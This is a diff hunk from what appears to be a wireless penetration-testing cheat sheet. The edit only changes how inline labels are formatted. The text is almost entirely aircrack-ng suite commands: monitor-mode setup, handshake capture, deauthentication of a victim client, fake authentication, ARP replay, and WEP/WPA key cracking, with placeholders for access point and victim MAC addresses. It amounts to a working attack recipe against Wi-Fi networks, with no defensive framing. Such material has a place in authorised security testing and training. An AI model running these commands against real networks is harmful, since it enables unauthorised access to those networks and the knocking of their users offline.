@@ -29,21 +29,21 @@ You must choose a wireless module that has a chipset that is capable of being pu
 
 `airmon-ng start wlan0`  
 `airodump-ng -c $channel –bssid $AP_MAC -w $out_file wlan0mon`  
-`aireplay-ng -0 1 -a $AP_MAC -c $victim_MAC wlan0mon` {deauth attack}  
+`aireplay-ng -0 1 -a $AP_MAC -c $victim_MAC wlan0mon` \#{deauth attack}  
 `aircrack-ng -0 -w $pass_list $cap_file`
 
 ## **Cracking WEP**
 
 ###  **with Connected Clients**
 
-`airmon-ng start wlan0 [$channel]`  
+`airmon-ng start wlan0 #[$channel]`  
 `airodump-ng -c $channel –bssid $AP_MAC -w $out_file wlan0mon`  
-`aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon` {fake authentication}  
-`aireplay-ng -3 -b $AP_MAC -h $host_MAC wlan0mon` {ARP replay attack}`aireplay-ng -0 1 -a $AP_MAC -c $victim_client wlan0mon` {deauth attack - as needed}
+`aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $host_MAC wlan0mon` \#{fake authentication}  
+`aireplay-ng -3 -b $AP_MAC -h $host_MAC wlan0mon` \#{ARP replay attack}`aireplay-ng -0 1 -a $AP_MAC -c $victim_client wlan0mon` \#{deauth attack - as needed}
 
 ### **via a Client**
 
-`airmon-ng start wlan0 [$channel]`  
+`airmon-ng start wlan0 #[$channel]`  
 `airodump-ng -c $channel –bssid $AP_MAC -w $out_file wlan0mon`  
 aireplay-ng -1 0 -e \(ESSID\) -a \(AP MAC\) -h \(OUR MAC\) wlan0mon {fake authentication}  
 aireplay-ng -2 -b \(AP MAC\) -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon  
